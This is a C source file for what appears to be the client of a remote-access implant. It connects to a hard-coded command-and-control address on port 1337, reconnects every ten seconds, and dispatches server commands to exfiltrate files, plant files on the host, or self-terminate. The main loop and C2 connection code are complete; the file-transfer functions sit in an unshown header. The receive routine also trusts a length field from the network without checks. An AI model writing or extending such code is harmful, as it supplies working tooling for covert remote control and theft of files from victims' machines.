#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netdb.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <arpa/inet.h>
#include <stdbool.h>

#include "cnc_prot.h"
#include "actions.h"

#define CNC_PORT 1337
#define CNC_ADDR "127.0.0.1"

int connect_cnc()
{
    int sockfd = 0;
    int err = 0;
    struct sockaddr_in cnc_addr;

    memset((void *)&cnc_addr, 0, sizeof(cnc_addr));

    cnc_addr.sin_family = AF_INET;
    cnc_addr.sin_port = htons(CNC_PORT);

    if ((err = socket(AF_INET, SOCK_STREAM, 0)) < 0)
    {
        perror("Failed to create socket");
        return err;
    }

    sockfd = err;

    if ((err = inet_pton(cnc_addr.sin_family, CNC_ADDR, &cnc_addr.sin_addr)) <= 0)
    {
        perror("Invalid address");
        return err;
    }

    if ((err = connect(sockfd, (struct sockaddr *)&cnc_addr, sizeof(cnc_addr))) < 0)
    {
        perror("Failed to connect to host");
        return err;
    }

    return sockfd;
}

struct cnc_request *receive_command(int sockfd)
{
    struct cnc_request req_tmp;
    struct cnc_request *req;

    if (read(sockfd, &req_tmp, sizeof(struct cnc_request)) != sizeof(struct cnc_request))
    {
        perror("Failed to receive command");
        return NULL;
    }

    req = malloc(req_tmp.req_len);

    memset(req, 0, req_tmp.req_len);
    memcpy(req, &req_tmp, sizeof(req_tmp));

    printf("Command Info:\n\ttype: %hhu\n\trequest length: %hu\n", req->type, req->req_len);

    read(sockfd, req->data, req->req_len - sizeof(struct cnc_request));

    return req;
}

int main()
{
    int sockfd = 0;
    bool is_suicidal = false;
    struct cnc_request *req;

    while (1)
    {
        while ((sockfd = connect_cnc()) < 0)
        {
            sleep(10);
        }

        puts("Connection successfully established");

        while (req = receive_command(sockfd))
        {
            switch (req->type)
            {
            case EXF_FILE:
                puts("File exfiltration command received");
                exfiltrate_file(sockfd, req);
                break;

            case INF_FILE:
                puts("File infiltration command received");
                infiltrate_file(sockfd, req);
                break;

            case SUICIDE:
                puts("Suicide command received");
                is_suicidal = true;
                break;

            default:
                perror("Invalid command");
            }

            free(req);
            req = NULL;

            if (is_suicidal)
                goto cleanup;
        }
    }

cleanup:
    close(sockfd);

    return 0;
}
